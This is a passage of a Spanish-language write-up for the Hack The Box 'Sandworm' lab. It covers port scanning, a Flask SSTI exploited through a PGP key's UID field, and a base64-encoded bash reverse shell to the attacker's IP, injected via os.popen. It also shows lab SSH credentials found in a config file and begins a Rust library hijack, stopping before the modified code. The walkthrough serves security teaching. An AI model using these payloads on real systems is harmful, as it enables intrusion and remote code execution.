@@ -1,0 +1,377 @@
+I"�<p>Tenemos un sitio web el cual nos permite realizar varias operaciones con claves PGP, donde descubriremos que el campo UID es vulnerable a <strong>SSTI</strong> con el que conseguiremos RCE, despues haremos movimiento lateral de atlas –&gt; silentobserver via <strong>firejail scape</strong>, despues otro movimiento laterial de silentobserver –&gt; atlas, modificando una libreria de Rust para ejecutar comandos y mandarnos una rev shell, y para la escalada de privilegios explotaremos una vulnerabilidad de firejail donde necesitaremos dos conexiones como Atlas para explotarla.</p>
+
+<h2 class="lead" id="enumeracion">Enumeracion</h2>
+
+<p>Iniciamos con un escaneo de nmap con:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nmap</span> <span class="o">-</span><span class="n">sS</span> <span class="o">-</span><span class="n">n</span> <span class="o">-</span><span class="no">Pn</span> <span class="o">-</span><span class="no">T4</span> <span class="o">--</span><span class="nb">open</span> <span class="o">-</span><span class="nb">p</span><span class="o">-</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">11.152</span>
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>sS: haga un TCP SYN Scan el cual hace que el destino responda con un RST si el puerto esta cerrado, o con un SYN/ACK si esta abierto, y ademas para que vaya mas rapido</p>
+  </li>
+  <li>
+    <p>n: para que no haga resolucion DNS y tarde menos el escaneo</p>
+  </li>
+  <li>
+    <p>Pn: para evitar el descubrimiento de hosts</p>
+  </li>
+  <li>
+    <p>open: para que solo muestre los puertos abiertos</p>
+  </li>
+  <li>
+    <p>-p-: para que escanee todo el rango de puertos</p>
+  </li>
+</ul>
+
+<p>Y nos reporto que hay varios puertos abiertos:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="no">PORT</span>    <span class="no">STATE</span> <span class="no">SERVICE</span>
+<span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">ssh</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">http</span>
+<span class="mi">443</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">https</span>
+</code></pre></div></div>
+
+<p>Ahora escanearemos para obtener mas informacion sobre la version y el servicio que estan corriendo bajo esos puertos:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">nmap</span> <span class="o">-</span><span class="n">sCV</span> <span class="o">-</span><span class="n">p22</span><span class="p">,</span><span class="mi">80</span><span class="p">,</span><span class="mi">443</span> <span class="mf">10.10</span><span class="o">.</span><span class="mf">11.218</span>
+</code></pre></div></div>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">22</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">ssh</span>      <span class="no">OpenSSH</span> <span class="mf">8.9</span><span class="n">p1</span> <span class="no">Ubuntu</span> <span class="mi">3</span><span class="n">ubuntu0</span><span class="o">.</span><span class="mi">1</span> <span class="p">(</span><span class="no">Ubuntu</span> <span class="no">Linux</span><span class="p">;</span> <span class="n">protocol</span> <span class="mf">2.0</span><span class="p">)</span>
+<span class="o">|</span> <span class="n">ssh</span><span class="o">-</span><span class="ss">hostkey: 
+</span><span class="o">|</span>   <span class="mi">256</span> <span class="n">b7</span><span class="p">:</span><span class="mi">89</span><span class="p">:</span><span class="mi">6</span><span class="n">c</span><span class="p">:</span><span class="mi">0</span><span class="n">b</span><span class="p">:</span><span class="mi">20</span><span class="ss">:ed</span><span class="p">:</span><span class="mi">49</span><span class="ss">:b2:c1</span><span class="p">:</span><span class="mi">86</span><span class="p">:</span><span class="mi">7</span><span class="n">c</span><span class="p">:</span><span class="mi">29</span><span class="p">:</span><span class="mi">92</span><span class="p">:</span><span class="mi">74</span><span class="p">:</span><span class="mi">1</span><span class="n">c</span><span class="p">:</span><span class="mi">1</span><span class="n">f</span> <span class="p">(</span><span class="no">ECDSA</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_</span>  <span class="mi">256</span> <span class="mi">18</span><span class="ss">:cd</span><span class="p">:</span><span class="mi">9</span><span class="n">d</span><span class="p">:</span><span class="mi">08</span><span class="ss">:a6</span><span class="p">:</span><span class="mi">21</span><span class="ss">:a8:b8:b6:f7</span><span class="p">:</span><span class="mi">9</span><span class="n">f</span><span class="p">:</span><span class="mi">8</span><span class="n">d</span><span class="p">:</span><span class="mi">40</span><span class="p">:</span><span class="mi">51</span><span class="p">:</span><span class="mi">54</span><span class="ss">:fb</span> <span class="p">(</span><span class="no">ED25519</span><span class="p">)</span>
+<span class="mi">80</span><span class="o">/</span><span class="n">tcp</span>  <span class="nb">open</span>  <span class="n">http</span>     <span class="n">nginx</span> <span class="mf">1.18</span><span class="o">.</span><span class="mi">0</span> <span class="p">(</span><span class="no">Ubuntu</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="ss">header: </span><span class="n">nginx</span><span class="o">/</span><span class="mf">1.18</span><span class="o">.</span><span class="mi">0</span> <span class="p">(</span><span class="no">Ubuntu</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="ss">title: </span><span class="no">Did</span> <span class="n">not</span> <span class="n">follow</span> <span class="n">redirect</span> <span class="n">to</span> <span class="n">https</span><span class="ss">:/</span><span class="o">/</span><span class="n">ssa</span><span class="p">.</span><span class="nf">htb</span><span class="o">/</span>
+<span class="mi">443</span><span class="o">/</span><span class="n">tcp</span> <span class="nb">open</span>  <span class="n">ssl</span><span class="o">/</span><span class="n">http</span> <span class="n">nginx</span> <span class="mf">1.18</span><span class="o">.</span><span class="mi">0</span> <span class="p">(</span><span class="no">Ubuntu</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="n">server</span><span class="o">-</span><span class="ss">header: </span><span class="n">nginx</span><span class="o">/</span><span class="mf">1.18</span><span class="o">.</span><span class="mi">0</span> <span class="p">(</span><span class="no">Ubuntu</span><span class="p">)</span>
+<span class="o">|</span><span class="n">_http</span><span class="o">-</span><span class="ss">title: </span><span class="no">Secret</span> <span class="no">Spy</span> <span class="no">Agency</span> <span class="o">|</span> <span class="no">Secret</span> <span class="no">Security</span> <span class="no">Service</span>
+<span class="o">|</span> <span class="n">ssl</span><span class="o">-</span><span class="ss">cert: </span><span class="no">Subject</span><span class="p">:</span> <span class="n">commonName</span><span class="o">=</span><span class="no">SSA</span><span class="o">/</span><span class="n">organizationName</span><span class="o">=</span><span class="no">Secret</span> <span class="no">Spy</span> <span class="no">Agency</span><span class="o">/</span><span class="n">stateOrProvinceName</span><span class="o">=</span><span class="no">Classified</span><span class="o">/</span><span class="n">countryName</span><span class="o">=</span><span class="no">SA</span>
+<span class="o">|</span> <span class="no">Not</span> <span class="n">valid</span> <span class="ss">before: </span><span class="mi">2023</span><span class="o">-</span><span class="mo">05</span><span class="o">-</span><span class="mo">04</span><span class="no">T18</span><span class="p">:</span><span class="mo">03</span><span class="p">:</span><span class="mi">25</span>
+<span class="o">|</span><span class="n">_Not</span> <span class="n">valid</span> <span class="ss">after:  </span><span class="mi">2050</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mi">19</span><span class="no">T18</span><span class="p">:</span><span class="mo">03</span><span class="p">:</span><span class="mi">25</span>
+<span class="no">Service</span> <span class="no">Info</span><span class="p">:</span> <span class="no">OS</span><span class="p">:</span> <span class="no">Linux</span><span class="p">;</span> <span class="no">CPE</span><span class="p">:</span> <span class="n">cpe</span><span class="ss">:/</span><span class="n">o</span><span class="ss">:linux:linux_kernel</span>
+</code></pre></div></div>
+
+<p>En el puerto 22 no vamos a poder hacer nada sin credenciales, y el puerto 80 nos redirige a <strong>ssa.htb</strong>, asi que hay que agregarlo al <strong>etc/hosts</strong>:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">echo</span> <span class="s2">"10.10.11.218     ssa.htb"</span> <span class="o">|</span> <span class="n">tee</span> <span class="o">-</span><span class="n">a</span> <span class="sr">/etc/</span><span class="n">hosts</span>
+</code></pre></div></div>
+
+<h3 id="fuzzing-de-directorios">Fuzzing de directorios</h3>
+
+<p>Podemos usar wffuzz para enumerar directorios mediante fuerza bruta:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">wfuzz</span> <span class="o">-</span><span class="n">u</span> <span class="s1">'https://ssa.htb/FUZZ'</span> <span class="o">-</span><span class="n">w</span> <span class="sr">/usr/s</span><span class="n">hare</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">directory</span><span class="o">-</span><span class="n">list</span><span class="o">-</span><span class="mf">2.3</span><span class="o">-</span><span class="n">medium</span><span class="p">.</span><span class="nf">txt</span> <span class="o">-</span><span class="n">t</span> <span class="mi">100</span> <span class="o">--</span><span class="n">hc</span><span class="o">=</span><span class="mi">404</span><span class="p">,</span><span class="mi">405</span>
+</code></pre></div></div>
+
+<p>Vamos a descubrir varios:</p>
+
+<ul>
+  <li>view</li>
+  <li>about</li>
+  <li>login</li>
+  <li>logout</li>
+  <li>contact</li>
+  <li>admin</li>
+  <li>guide</li>
+  <li>pgp</li>
+</ul>
+
+<h3 id="explorando-ssahtb">Explorando ssa.htb</h3>
+
+<p>Al explorar el home, hay algo que llama la atencion, que esta usando flask:</p>
+
+<p><img src="/assets/img/sandworm/1.png" alt="" /></p>
+
+<p>Una vulnerabilidad comun en flask es <strong>SSTI</strong>(Server Side Template Injection)</p>
+
+<p>En el directorio <strong>contact</strong> si leemos, nos dice que podemos subir un texto cifrado usando PGP</p>
+
+<p><img src="/assets/img/sandworm/2.png" alt="" /></p>
+
+<p>En la parte de hasta abajo nos dice: <strong>Don’t know how to use PGP? Check out our guide</strong> y tiene un hipervinculo, si le damos click, nos llevara al directorio <strong>/guide</strong> donde podemos hacer varias cosas con PGP, como cifrar y decifrar texto.</p>
+
+<p>Tambien donde dice: <strong>Practice by importing our public key and encrypting, signing, and verifying messages.</strong> tenemos otro hipervinculo que nos lleva a <strong>/pgp</strong>, que nos muestra una clave publica PGP.</p>
+
+<p>Entonces recapitulando, tenemos:</p>
+
+<ul>
+  <li><strong>/contact</strong>: Nos permite enviar un texto cifrado con PGP</li>
+  <li><strong>/guide</strong>: Nos permite cifrar y desifrar texto, asi como verificar la firma de un texto</li>
+  <li><strong>/pgp</strong>: Nos proporcionar una clave PGP publica</li>
+</ul>
+
+<h3 id="explorando-funciones">Explorando funciones</h3>
+
+<p>Debido a que el sitio web reliza operaciones con claves PGP, podemos generar las nuestras, en mi caso usare <strong>GPG</strong> y me guiare de <a href="https://itslinuxfoss.com/generate-pgp-keys-with-gpg/">aqui</a></p>
+
+<p>Como nomas es algo rapido, usare <strong>–quick-gen-key</strong> que solo ocupa el UID (user id)</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gpg</span> <span class="o">--</span><span class="n">quick</span><span class="o">-</span><span class="n">gen</span><span class="o">-</span><span class="n">key</span> <span class="n">c4rta</span>
+</code></pre></div></div>
+
+<p>Ahora exportaremos la clave a un archivo:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gpg</span> <span class="o">--</span><span class="n">armor</span> <span class="o">--</span><span class="n">export</span> <span class="n">c4rta</span> <span class="o">|</span> <span class="n">sponge</span> <span class="n">pubkey</span><span class="p">.</span><span class="nf">asc</span>
+</code></pre></div></div>
+
+<p>Y despues firmamos un texto que puede ser cual sea:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">echo</span> <span class="s1">'nazuna besto waifu'</span> <span class="o">|</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">clear</span><span class="o">-</span><span class="n">sign</span>
+</code></pre></div></div>
+
+<p>Regresando al sitio web, en esta parte</p>
+
+<p><img src="/assets/img/sandworm/3.png" alt="" /></p>
+
+<p>Del lado derecho copiamos el contenido de la clave que generamos  (pubkey.asc), y el lado izquierdo el mensaje firmado</p>
+
+<p>Y tendremos una salida como esta</p>
+
+<p><img src="/assets/img/sandworm/4.png" alt="" /></p>
+
+<p>Tenemos cosas, observa que el UID que pusimos cuando se genero le key, se muestra en el resultado, en mi caso el UID que puse fue <strong>c4rta</strong> y se ve reflejado</p>
+
+<h2 id="ssti-server-side-template-injection">SSTI (Server Side Template Injection)</h2>
+
+<p>SSTI significa <strong>inyeccion de plantillas del lado del servidor</strong>, y es una vulnerabilidad que permite a los atacantes inyectar plantillas maliciosas en un motor de plantillas, la cual sera renderizada por el servidor, esto con el fin de ejecutar comandos del lado del servidor, de ahi su nombre <strong>Server Side</strong>, si quieres saber mas sobre SSTI, te recomiendo ver un post que le dedique –&gt; <a href="https://ic4rta.github.io/2023/05/29/UPDP-ssti/">SSTI</a></p>
+
+<p>Una vez sabiendo que es SSTI, lo que podriar estar pasando es que la funcion que se encarga de verificar la firma y el  motor de plantillas, estan procesando la informacion que le pasamos por el UID e inyecta esa informacion en la plantilla, despues la renderiza y la muestra en el sitio web.</p>
+
+<p>Como sabemos que el UID es posiblemente el atributo vulnerable, editaremos la clave y su UID</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gpg</span> <span class="o">--</span><span class="n">edit</span><span class="o">-</span><span class="n">key</span> <span class="n">c4rta</span>
+</code></pre></div></div>
+
+<p>Usamos <strong>adduid</strong> para modificar el UID</p>
+
+<p>Cuando nos pida el Real name, ingresaremos el payload SSTI a probar: en mi caso: <em>**</em></p>
+
+<p>Deberia quedar algo asi si todo va bien</p>
+
+<p><img src="/assets/img/sandworm/5.png" alt="" /></p>
+
+<p>Despues ingresamos <strong>trust</strong> a ingresamos la opcion <strong>5</strong></p>
+
+<p>Despues de esto nos van aparecer dos UID, como se ve en la imagen, el numero entre parentesis es su indentificador</p>
+
+<p><img src="/assets/img/sandworm/6.png" alt="" /></p>
+
+<p>Ahora selecionaremos el UID viejo, en mi caso <strong>c4rta</strong></p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">uid</span> <span class="mi">1</span>
+</code></pre></div></div>
+
+<p>Y lo eliminamos</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">deluid</span>
+</code></pre></div></div>
+
+<p>Ahora solo nos debe de quedar un UID que es el que tiene el payload</p>
+
+<p><img src="/assets/img/sandworm/7.png" alt="" /></p>
+
+<p>Para terminar le damos <strong>save</strong> para guardar cambios, volvemos a generar la clave, firmamos un texto y probamos en el sitio web</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gpg</span> <span class="o">--</span><span class="n">armor</span> <span class="o">--</span><span class="n">export</span> <span class="s2">" &lt;c4rta@email.com&gt;"</span> <span class="o">|</span> <span class="n">sponge</span> <span class="n">pubkey</span><span class="p">.</span><span class="nf">asc</span>
+</code></pre></div></div>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">echo</span> <span class="s1">'nazuna besto waifu'</span> <span class="o">|</span> <span class="n">gpg</span> <span class="o">--</span><span class="n">clear</span><span class="o">-</span><span class="n">sign</span>
+</code></pre></div></div>
+
+<p>Observa como en la respuesta sale un <strong>49</strong></p>
+
+<p><img src="/assets/img/sandworm/8.png" alt="" /></p>
+
+<p>Eso quiere decir que la operacion se realizo por que el motor de plantillas proceso el payload e inyecto el resultado en la plantilla para luego mostrarlo en el sitio web, y con eso confirmamos que es vulnerable a <strong>SSTI</strong></p>
+
+<p>Ahora haremos lo mismo de modificar el UID, generar la clave, etc, para conseguir RCE y tener una rev shell</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">echo</span> <span class="s2">"bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;tu IP&gt;/444 0&gt;&amp;1'"</span> <span class="o">|</span> <span class="n">base64</span>
+</code></pre></div></div>
+
+<p>Y el payload queda asi:</p>
+
+<p><img src="/assets/img/sandworm/10.png" alt="" /></p>
+
+<table>
+  <tbody>
+    <tr>
+      <td>{{ self.<strong>init</strong>.<strong>globals</strong>.<strong>builtins</strong>.<strong>import</strong>(‘os’).popen(‘echo “YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC45NS80NDQgMD4mMScK”</td>
+      <td>base64 -d</td>
+      <td>bash’).read() }}</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>Lo probramos y nos llega una rev shell</p>
+
+<p><img src="/assets/img/sandworm/9.png" alt="" /></p>
+
+<h2 id="movimiento-lateral-atlas--silentobserver-firejail-scape-y-flag-de-user">Movimiento lateral: atlas –&gt; silentobserver (firejail scape) y flag de user</h2>
+
+<p>Si probamos con varios comandos, vamos a ver que no nos deja</p>
+
+<p><img src="/assets/img/sandworm/11.png" alt="" /></p>
+
+<p>Esto es un caso tipico de que estemos en un sandbox y comunmente es <strong>firejail</strong>.</p>
+
+<p>Si nos vamos al directorios del usuario <strong>atlas</strong> vamos a poder ver que se encuentra un directorio <strong>.config</strong></p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">4</span> <span class="n">atlas</span>  <span class="n">atlas</span>   <span class="mi">4096</span> <span class="no">Jan</span> <span class="mi">15</span>  <span class="mi">2023</span> <span class="p">.</span><span class="nf">config</span>
+</code></pre></div></div>
+
+<p>Donde estaran otros dos directorios</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">dr</span><span class="o">--------</span> <span class="mi">2</span> <span class="n">nobody</span> <span class="n">nogroup</span>   <span class="mi">40</span> <span class="no">Sep</span> <span class="mi">10</span> <span class="mi">11</span><span class="p">:</span><span class="mi">11</span> <span class="n">firejail</span>
+<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span> <span class="mi">3</span> <span class="n">nobody</span> <span class="n">atlas</span>   <span class="mi">4096</span> <span class="no">Jan</span> <span class="mi">15</span>  <span class="mi">2023</span> <span class="n">httpie</span>
+</code></pre></div></div>
+
+<p>Viendo los permisos y grupos, al unico que vamos a poder entrar es al <strong>httpie</strong></p>
+
+<p>Explorando mas, en el directorio: <strong>/home/atlas/.config/httpie/sessions/localhost_5000</strong> encontraremos un archivo <strong>admin.json</strong> con unas credenciales para el usuario <strong>silentobserver</strong></p>
+
+<ul>
+  <li><strong>usr</strong>: silentobserver</li>
+  <li><strong>pass</strong>: quietLiketheWind22</li>
+</ul>
+
+<p>Como tenemos el SSH abierto, las probaremos ahi</p>
+
+<p>Y ya tenemos la flag de user:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">silentobserver</span><span class="vi">@sandworm</span><span class="ss">:~</span><span class="err">$</span> <span class="n">ls</span>
+<span class="n">lib</span><span class="p">.</span><span class="nf">rs</span>  <span class="n">user</span><span class="p">.</span><span class="nf">txt</span>
+</code></pre></div></div>
+
+<h2 id="movimiento-lateral-silentobserver--atlas">Movimiento lateral: silentobserver –&gt; atlas</h2>
+
+<p>Buscando por binarios SUID encontramos uno que no parece comun</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">perm</span> <span class="o">-</span><span class="n">u</span><span class="o">=</span><span class="n">s</span> <span class="o">-</span><span class="n">type</span> <span class="n">f</span> <span class="mi">2</span><span class="o">&gt;</span><span class="sr">/dev/nu</span><span class="n">ll</span>
+</code></pre></div></div>
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sr">/opt/</span><span class="n">tipnet</span><span class="o">/</span><span class="n">target</span><span class="o">/</span><span class="n">debug</span><span class="o">/</span><span class="n">tipnet</span>
+</code></pre></div></div>
+
+<p>Adicionalmente podemos ver que ese binario se esta ejecutando:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">silentobserver</span><span class="vi">@sandworm</span><span class="ss">:~</span><span class="err">$</span> <span class="n">ps</span> <span class="o">-</span><span class="n">aux</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">i</span> <span class="n">tipnet</span>
+<span class="n">silento</span><span class="o">+</span>   <span class="mi">73007</span>  <span class="mf">0.0</span>  <span class="mf">0.0</span>   <span class="mi">6608</span>  <span class="mi">2412</span> <span class="n">pts</span><span class="o">/</span><span class="mi">0</span>    <span class="no">S</span><span class="o">+</span>   <span class="mi">16</span><span class="p">:</span><span class="mi">59</span>   <span class="mi">0</span><span class="p">:</span><span class="mo">00</span> <span class="n">grep</span> <span class="o">--</span><span class="n">color</span><span class="o">=</span><span class="n">auto</span> <span class="o">-</span><span class="n">i</span> <span class="n">tipnet</span>
+</code></pre></div></div>
+
+<p>Viendo el contenido del directorio, es obvio que es un proyecto de Rust:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span>   <span class="mi">7</span> <span class="n">root</span>  <span class="n">atlas</span>     <span class="mi">4096</span> <span class="no">Sep</span> <span class="mi">10</span> <span class="mi">12</span><span class="p">:</span><span class="mo">06</span> <span class="p">.</span><span class="nf">/</span>
+<span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span>   <span class="mi">3</span> <span class="n">root</span>  <span class="n">atlas</span>     <span class="mi">4096</span> <span class="no">Jun</span>  <span class="mi">6</span> <span class="mi">11</span><span class="p">:</span><span class="mi">49</span> <span class="o">..</span><span class="sr">/
+drwxrwxr-x 142 atlas atlas    12288 Jun  6 11:49 build/</span>
+<span class="o">-</span><span class="n">rwxrwxr</span><span class="o">--</span>   <span class="mi">1</span> <span class="n">root</span>  <span class="n">atlas</span>        <span class="mi">0</span> <span class="no">Feb</span>  <span class="mi">8</span>  <span class="mi">2023</span> <span class="p">.</span><span class="nf">cargo</span><span class="o">-</span><span class="n">lock</span><span class="o">*</span>
+<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span>   <span class="mi">2</span> <span class="n">atlas</span> <span class="n">atlas</span>    <span class="mi">69632</span> <span class="no">Sep</span> <span class="mi">10</span> <span class="mi">12</span><span class="p">:</span><span class="mo">06</span> <span class="n">deps</span><span class="o">/</span>
+<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span>   <span class="mi">2</span> <span class="n">atlas</span> <span class="n">atlas</span>     <span class="mi">4096</span> <span class="no">Jun</span>  <span class="mi">6</span> <span class="mi">11</span><span class="p">:</span><span class="mi">49</span> <span class="n">examples</span><span class="o">/</span>
+<span class="n">drwxrwxr</span><span class="o">--</span> <span class="mi">472</span> <span class="n">root</span>  <span class="n">atlas</span>    <span class="mi">24576</span> <span class="no">Jun</span>  <span class="mi">6</span> <span class="mi">11</span><span class="p">:</span><span class="mi">49</span> <span class="p">.</span><span class="nf">fingerprint</span><span class="o">/</span>
+<span class="n">drwxrwxr</span><span class="o">-</span><span class="n">x</span>   <span class="mi">6</span> <span class="n">atlas</span> <span class="n">atlas</span>     <span class="mi">4096</span> <span class="no">Jun</span>  <span class="mi">6</span> <span class="mi">11</span><span class="p">:</span><span class="mi">49</span> <span class="n">incremental</span><span class="o">/</span>
+<span class="o">-</span><span class="n">rwsrwxr</span><span class="o">-</span><span class="n">x</span>   <span class="mi">2</span> <span class="n">atlas</span> <span class="n">atlas</span> <span class="mi">59047248</span> <span class="no">Sep</span> <span class="mi">10</span> <span class="mi">12</span><span class="p">:</span><span class="mo">06</span> <span class="n">tipnet</span><span class="o">*</span>
+<span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span>   <span class="mi">1</span> <span class="n">atlas</span> <span class="n">atlas</span>       <span class="mi">87</span> <span class="no">May</span>  <span class="mi">4</span> <span class="mi">17</span><span class="p">:</span><span class="mi">24</span> <span class="n">tipnet</span><span class="p">.</span><span class="nf">d</span>
+</code></pre></div></div>
+<p>En el directorio: <strong>/opt/tipnet/src</strong> vamos a poder encontrar el codigo fuente el archivo.</p>
+
+<p>Basicamente el codigo lo que hace es interactuar con una base de datos usando <strong>upstream</strong> y <strong>pull</strong> y manipula archivos.</p>
+
+<p>Sin embargo, podemos ver que esta haciendo uso de una libreria externa: <strong>extern crate logger;</strong>, esto es interesante por que no la esta importando desde internet, si no desde la maquina, asi que de debe de encontrar en algun lugar del proyecto. Buscando un poco, la ruta en la que se encuentra es en: <strong>/opt/crates/logger/src</strong></p>
+
+<div class="language-rust highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">extern</span> <span class="n">crate</span> <span class="n">chrono</span><span class="p">;</span>
+
+<span class="k">use</span> <span class="nn">std</span><span class="p">::</span><span class="nn">fs</span><span class="p">::</span><span class="n">OpenOptions</span><span class="p">;</span>
+<span class="k">use</span> <span class="nn">std</span><span class="p">::</span><span class="nn">io</span><span class="p">::</span><span class="n">Write</span><span class="p">;</span>
+<span class="k">use</span> <span class="nn">chrono</span><span class="p">::</span><span class="nn">prelude</span><span class="p">::</span><span class="o">*</span><span class="p">;</span>
+
+<span class="k">pub</span> <span class="k">fn</span> <span class="k">log</span><span class="p">(</span><span class="n">user</span><span class="p">:</span> <span class="o">&amp;</span><span class="nb">str</span><span class="p">,</span> <span class="n">query</span><span class="p">:</span> <span class="o">&amp;</span><span class="nb">str</span><span class="p">,</span> <span class="n">justification</span><span class="p">:</span> <span class="o">&amp;</span><span class="nb">str</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">let</span> <span class="n">now</span> <span class="o">=</span> <span class="nn">Local</span><span class="p">::</span><span class="nf">now</span><span class="p">();</span>
+    <span class="k">let</span> <span class="n">timestamp</span> <span class="o">=</span> <span class="n">now</span><span class="nf">.format</span><span class="p">(</span><span class="s">"%Y-%m-%d %H:%M:%S"</span><span class="p">)</span><span class="nf">.to_string</span><span class="p">();</span>
+    <span class="k">let</span> <span class="n">log_message</span> <span class="o">=</span> <span class="nd">format!</span><span class="p">(</span><span class="s">"[{}] - User: {}, Query: {}, Justification: {}</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">timestamp</span><span class="p">,</span> <span class="n">user</span><span class="p">,</span> <span class="n">query</span><span class="p">,</span> <span class="n">justification</span><span class="p">);</span>
+
+    <span class="k">let</span> <span class="k">mut</span> <span class="n">file</span> <span class="o">=</span> <span class="k">match</span> <span class="nn">OpenOptions</span><span class="p">::</span><span class="nf">new</span><span class="p">()</span><span class="nf">.append</span><span class="p">(</span><span class="k">true</span><span class="p">)</span><span class="nf">.create</span><span class="p">(</span><span class="k">true</span><span class="p">)</span><span class="nf">.open</span><span class="p">(</span><span class="s">"/opt/tipnet/access.log"</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nf">Ok</span><span class="p">(</span><span class="n">file</span><span class="p">)</span> <span class="k">=&gt;</span> <span class="n">file</span><span class="p">,</span>
+        <span class="nf">Err</span><span class="p">(</span><span class="n">e</span><span class="p">)</span> <span class="k">=&gt;</span> <span class="p">{</span>
+            <span class="nd">println!</span><span class="p">(</span><span class="s">"Error opening log file: {}"</span><span class="p">,</span> <span class="n">e</span><span class="p">);</span>
+            <span class="k">return</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">};</span>
+
+    <span class="k">if</span> <span class="k">let</span> <span class="nf">Err</span><span class="p">(</span><span class="n">e</span><span class="p">)</span> <span class="o">=</span> <span class="n">file</span><span class="nf">.write_all</span><span class="p">(</span><span class="n">log_message</span><span class="nf">.as_bytes</span><span class="p">())</span> <span class="p">{</span>
+        <span class="nd">println!</span><span class="p">(</span><span class="s">"Error writing to log file: {}"</span><span class="p">,</span> <span class="n">e</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>Si vemos sus permisos, en la parte de grupo nos dice que hay permisos de lectura y escritura para el grupo <strong>silentobserver</strong>:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span> <span class="mi">1</span> <span class="n">atlas</span> <span class="n">silentobserver</span>  <span class="mi">732</span> <span class="no">May</span>  <span class="mi">4</span> <span class="mi">17</span><span class="p">:</span><span class="mi">12</span> <span class="n">lib</span><span class="p">.</span><span class="nf">rs</span>
+</code></pre></div></div>
+
+<p>Y nosotros somos de ese grupo:</p>
+
+<div class="language-ruby highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">silentobserver</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">silentobserver</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">silentobserver</span><span class="p">)</span>
+</code></pre></div></div>
+
+<p>Sabiendo que la libreria se manda a llamar en el binario <strong>tipnet</strong>, y ese binario se ejecuta como <strong>Atlas</strong>, podemos modificar el codigo de la libreria para ejecutar un comando y que nos de una rev shell.</p>
+
+<p>Y esto podria ser un: <strong>Rust library hijacking (RW permissions)</strong>.</p>
+
+<p>Vamos a modificar el codigo para que ejecute un comando:</p>
+
